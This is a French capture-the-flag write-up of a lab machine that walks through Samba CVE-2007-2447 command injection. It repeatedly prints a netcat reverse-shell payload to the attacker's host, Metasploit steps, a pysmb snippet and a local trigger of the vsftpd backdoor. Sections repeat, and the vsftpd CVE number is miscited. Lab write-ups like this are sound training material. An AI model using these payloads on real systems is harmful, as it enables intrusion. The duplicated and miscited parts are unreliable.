![Cover](cover.png)

### 1. Reconnaissance & Scanning

Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d'attaque. J'utilise **nmap** avec une vitesse d'émission élevée pour un premier tri, suivi d'un scan de services détaillé.

```bash
# Scan TCP complet (tous les ports)
nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3

# Scan de services et scripts par défaut sur les ports identifiés
nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
```

**Résultats du scan :**
*   **Port 21 (FTP) :** **vsftpd 2.3.4**. L'accès **Anonymous FTP login** est autorisé.
*   **Port 22 (SSH) :** **OpenSSH 4.7p1**. Version très ancienne (Ubuntu 8.04), suggérant un système obsolète.
*   **Ports 139/445 (SMB) :** **Samba 3.0.20-Debian**.
*   **Port 3632 (distccd) :** **distccd v1**.

---

### 2. Énumération des Services

#### FTP (vsftpd 2.3.4)
Le service **vsftpd 2.3.4** est célèbre pour une **Backdoor** introduite dans son code source (CVE-2011-0762). Elle se déclenche en envoyant un **username** se terminant par `:)`. 

> **Schéma Mental :**
> L'attaquant envoie `USER user:)` -> Le service ouvre un **Bind Shell** sur le port **6200/TCP**. 
> *Problème ici :* Bien que le service soit vulnérable, le port 6200 semble filtré par un firewall ou non exposé, rendant l'exploitation directe impossible depuis l'extérieur.

#### SMB (Samba 3.0.20)
J'utilise **smbmap** pour lister les partages accessibles sans authentification.

```bash
smbmap -H 10.10.10.3
```

Le partage `/tmp` est accessible en **READ/WRITE**. Cependant, la version de **Samba (3.0.20)** attire immédiatement mon attention. Elle est sujette à la vulnérabilité **Username Map Script** (**CVE-2007-2447**).

---

### 3. Analyse de la Vulnérabilité : CVE-2007-2447

La vulnérabilité réside dans la configuration non sécurisée de l'option `username map script`. Samba permet de passer le nom d'utilisateur à un script externe avant l'authentification. Si les métacaractères du shell ne sont pas filtrés, il est possible d'injecter des commandes arbitraires.

> **Schéma Mental :**
> Requête SMB de session -> Champ `username` contient des backticks ou une substitution de commande : `"/=`nohup [command]`"` -> Le démon Samba exécute la commande avec les privilèges du service (souvent **root**).

---

### 4. Exploitation & Initial Access

#### Méthode Manuelle (smbclient)
Pour exploiter cela manuellement, je dois forcer l'utilisation du protocole **NT1** (ancien SMB) car les clients modernes le désactivent par sécurité. J'utilise la commande `logon` à l'intérieur de **smbclient** pour injecter mon **Reverse Shell**.

```bash
# Préparation du listener
nc -lnvp 443

# Injection via smbclient
smbclient //10.10.10.3/tmp --option='client min protocol=NT1'
# Une fois connecté :
logon "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
```

#### Méthode via Metasploit
Le module `exploit/multi/samba/usermap_script` automatise parfaitement ce vecteur.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
set LPORT 443
set PAYLOAD cmd/unix/reverse
exploit
```

**Résultat :** J'obtiens une session avec les privilèges **root** immédiatement, car le service Samba tourne avec les droits les plus élevés sur cette version d'Ubuntu.

```bash
id
uid=0(root) gid=0(root)
```

#### Stabilisation du Shell
Pour obtenir un shell interactif propre, j'utilise **Python** pour spawn un **PTY**.

```bash
python -c 'import pty; pty.spawn("bash")'
```

---

### Post-Exploitation & Shell Stabilization

Une fois l'accès initial obtenu via l'exploitation du service **Samba**, je me retrouve avec un shell rudimentaire. La première étape consiste à stabiliser ce shell pour obtenir un terminal interactif complet (**TTY**), ce qui est indispensable pour manipuler les éditeurs de texte ou gérer les signaux (comme `Ctrl+C`).

```bash
# Stabilisation du shell via Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Exportation des variables d'environnement pour le confort
export TERM=xterm
```

### Énumération Interne (Post-Exploitation)

Bien que l'exploit **Samba usermap script** nous donne directement un accès **root**, il est crucial de comprendre l'environnement interne pour identifier d'éventuels pivots ou vecteurs de persistance. L'énumération des services en écoute locale révèle une surface d'attaque bien plus vaste que celle visible de l'extérieur.

```bash
# Identification des services en écoute (TCP)
netstat -tnlp

# Vérification des privilèges actuels
id
uid=0(root) gid=0(root)
```

L'analyse de `netstat` montre que de nombreux services (MySQL sur le port 3306, PostgreSQL sur le 5432, Apache sur le 80) sont actifs mais filtrés par un **Firewall** (probablement **iptables**). Cela explique pourquoi le scan **Nmap** initial était limité.

> **Schéma Mental :**
> **Recon Externe** (Ports limités par Firewall) -> **Exploitation** (Samba) -> **Recon Interne** (Services locaux non filtrés) -> **Analyse de Surface** (Identification des vecteurs de mouvement latéral potentiels).

### Analyse du Mouvement Latéral : Le cas VSFTPD

L'énumération interne permet de résoudre le mystère de l'échec de l'exploit **vsftpd 2.3.4 Backdoor**. Bien que la vulnérabilité soit présente, la connexion au shell de secours (port 6200) échoue systématiquement depuis l'extérieur.

En testant localement après avoir compromis la machine, je confirme la présence de la **Backdoor** :

```bash
# Tentative de déclenchement du backdoor localement
nc -nv 127.0.0.1 21
USER 0xdf:)
PASS password

# Vérification de l'ouverture du port 6200
netstat -tnlp | grep 6200
tcp 0 0 0.0.0.0:6200 0.0.0.0:* LISTEN 5580/vsftpd

# Connexion locale au shell root via le backdoor
nc 127.0.0.1 6200
id
uid=0(root) gid=0(root)
```

**Logique technique :** Le **Firewall** de la machine autorise le trafic entrant sur le port 21 (FTP), permettant ainsi d'envoyer le "trigger" (le smiley `:)` dans le username). Cependant, il bloque tout trafic entrant non sollicité sur le port 6200. Le mouvement latéral ou l'escalade via ce vecteur n'est donc possible que si l'on se trouve déjà sur le réseau local ou si l'on dispose d'un accès local.

### Escalade de Privilèges & Persistence

Sur cette machine spécifique, l'exploitation de **Samba** (CVE-2007-2447) court-circuite la phase habituelle d'escalade de privilèges (User -> Root) car le démon `smbd` tourne avec les droits **root**. 

```bash
# Recherche de fichiers sensibles pour la persistance ou le pivot
find / -name "user.txt" -o -name "root.txt" 2>/dev/null
cat /home/makis/user.txt
cat /root/root.txt
```

> **Schéma Mental (Samba Usermap Script) :**
> 1. **Input :** Username contenant des métacaractères shell (ex: `` `nohup payload` ``).
> 2. **Vulnerability :** Samba passe cette chaîne directement à un script de mapping sans sanitization.
> 3. **Execution :** Le shell exécute la commande encapsulée avec les privilèges du processus Samba (**root**).
> 4. **Result :** Remote Code Execution (RCE) immédiat en tant que super-utilisateur.

### Extraction des Flags

L'accès **root** étant confirmé, l'extraction des preuves se fait via une recherche simple dans les répertoires personnels.

```bash
# Extraction rapide des flags
find /home -name user.txt -exec cat {} \;
cat /root/root.txt
```

---

### Vecteur d'Exploitation : Samba "Username Map Script" (CVE-2007-2447)

L'analyse des services révèle une version de **Samba (3.0.20)** vulnérable à une injection de commande distante. Cette vulnérabilité, identifiée sous le code **CVE-2007-2447**, réside dans l'option de configuration non sécurisée `username map script`. Lorsqu'un utilisateur tente de s'authentifier, le nom d'utilisateur fourni est passé à un script externe sans filtrage adéquat des métacaractères du shell.

Puisque le démon **smbd** s'exécute avec les privilèges **root** pour gérer les accès aux fichiers, toute commande injectée via le champ "username" sera exécutée avec les droits les plus élevés du système.

> **Schéma Mental : Injection de Commande via SMB**
> 1. **Requête de Session** : L'attaquant initie une demande de connexion SMB (**Session Setup**).
> 2. **Payload Injection** : Le champ `username` contient des backticks (`` ` ``) ou une substitution de commande `$()`.
> 3. **Exécution Côté Serveur** : Samba appelle le script de mapping : `/bin/sh -c "/path/to/script [username]"`.
> 4. **Command Execution** : Le shell interprète le contenu des backticks comme une commande système.
> 5. **Privilege Escalation** : La commande s'exécute sous le contexte de l'utilisateur **root**.

#### Exploitation Manuelle (smbclient)

Je privilégie l'utilisation de **smbclient** pour déclencher la vulnérabilité sans dépendre de Metasploit. L'astuce consiste à utiliser la commande `logon` une fois connecté anonymement à un partage (comme `/tmp`).

```bash
# Configuration du listener
nc -lnvp 443

# Connexion au partage et injection du Reverse Shell
smbclient //10.10.10.3/tmp --option='client min protocol=NT1'
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
# Note : Le mot de passe peut être laissé vide.
```

#### Exploitation via Script Python (POC)

Il est également possible d'automatiser l'envoi du **Payload** via un script Python utilisant la bibliothèque `pysmb`.

```python
# Structure simplifiée du payload dans le script
username = "/=`nohup nc -e /bin/sh 10.10.14.24 443`"
conn = SMBConnection(username, "", "client", "server", use_ntlmv2=False)
conn.connect(target_ip, 139)
```

### Post-Exploitation & Domination

Une fois le **Reverse Shell** obtenu, je stabilise le terminal pour obtenir un shell interactif complet (**PTY**).

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z, stty raw -echo; fg, reset
```

L'accès est immédiatement **root**, ce qui permet de récupérer les flags sans étape supplémentaire d'élévation de privilèges locale.

```bash
id
# uid=0(root) gid=0(root)

cat /root/root.txt
cat /home/makis/user.txt
```

---

### Analyse "Beyond Root"

L'analyse post-compromission permet de comprendre pourquoi certains vecteurs ont échoué malgré la présence de services vulnérables.

#### Le cas vsFTPd 2.3.4
La machine expose un service **vsFTPd 2.3.4**, célèbre pour sa **Backdoor** (déclenchée par un smiley `:)` dans le nom d'utilisateur). Bien que j'aie pu déclencher l'ouverture du port **6200** sur la machine cible, la connexion a échoué.

**Analyse du Pare-feu :**
En inspectant les règles de filtrage locales ou en comparant les services internes avec le scan externe, on constate que le port **6200** est bloqué par une règle de **Firewall** (type IPTables).

```bash
# Vérification locale de l'ouverture du port après trigger
netstat -tnlp | grep 6200
# tcp 0 0 0.0.0.0:6200 0.0.0.0:* LISTEN 5580/vsftpd
```
Le port est bien en écoute sur `0.0.0.0`, mais les paquets entrants provenant de l'interface `eth0` (réseau HTB) sont rejetés. Seule une connexion locale (**Localhost**) permettrait d'accéder au shell via cette backdoor.

#### Services Internes Masqués
Le scan **Nmap** initial ne montrait que 5 ports. Une fois **root**, l'examen de `netstat` révèle une surface d'attaque interne bien plus vaste :
*   **NFS** (2049)
*   **MySQL** (3306)
*   **PostgreSQL** (5432)
*   **UnrealIRCd** (6667)
*   **Distccd** (3632) - Ce dernier était visible mais constitue un autre vecteur de **Remote Code Execution** (RCE) classique sur cette machine.

Cette configuration illustre l'importance de la segmentation réseau et du durcissement (**Hardening**) via pare-feu, même si les services eux-mêmes restent vulnérables.